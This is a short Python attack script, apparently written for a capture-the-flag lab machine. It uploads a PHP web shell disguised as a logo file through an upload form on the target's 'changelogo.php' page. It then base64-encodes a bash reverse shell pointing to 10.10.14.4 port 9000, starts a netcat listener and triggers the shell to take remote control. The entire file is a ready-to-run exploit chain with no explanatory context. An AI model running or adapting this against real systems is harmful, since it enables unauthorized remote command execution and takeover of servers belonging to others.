import urllib3
import base64
import requests
import subprocess
import time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

session = requests.Session()

url = 'http://10.10.10.109/sparklays/'

uploadURL = url + "design/changelogo.php"

content = "<?php echo system($_REQUEST['cmd']); ?>"

shellFile = {
		'file':('webshell.php5', content,'application/x-php'),
		'submit':(None,"upload file")
	}

data = {'parameter','example'}
session.post(uploadURL, verify=False, proxies=proxies, files=shellFile)

fileURL = url + "design/uploads/webshell.php5"

reverseCommand = "bash -i >& /dev/tcp/10.10.14.4/9000 0>&1"

message_bytes = reverseCommand.encode('ascii')
base64_bytes = base64.b64encode(message_bytes)
base64_message = base64_bytes.decode('ascii')

payload = {
'cmd': 'echo ' + base64_message + '| base64 -d | bash'
}

subprocess.Popen(["nc","-nvlp","9000"])
time.sleep(1)

r = session.post(fileURL, verify=False, proxies=proxies, data=payload)



